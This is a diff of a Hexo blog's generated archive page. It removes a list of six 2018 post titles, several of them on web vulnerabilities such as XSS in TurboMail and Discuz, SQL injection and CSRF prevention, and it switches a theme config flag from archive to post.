-      <a class="archive-article-title" href="/2018/11/26/原则/">原则</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/25/TurboMail存储型XSS漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-25T07:35:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/25/TurboMail存储型XSS漏洞/">TurboMail存储型XSS漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/25/Discuz全版本存储型DOM-XSS/" class="archive-article-date">
-  	<time datetime="2018-11-25T06:29:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/25/Discuz全版本存储型DOM-XSS/">Discuz全版本存储型DOM XSS</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/25/SQL注入与文件上传漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-25T04:07:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/25/SQL注入与文件上传漏洞/">SQL注入与文件上传漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/20/如何防止CSRF攻击/" class="archive-article-date">
-  	<time datetime="2018-11-20T07:15:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/20/如何防止CSRF攻击/">如何防止CSRF攻击</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/19/如何防止XSS/" class="archive-article-date">
-  	<time datetime="2018-11-19T13:38:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/19/如何防止XSS/">如何防止XSS?</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -694,8 +398,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
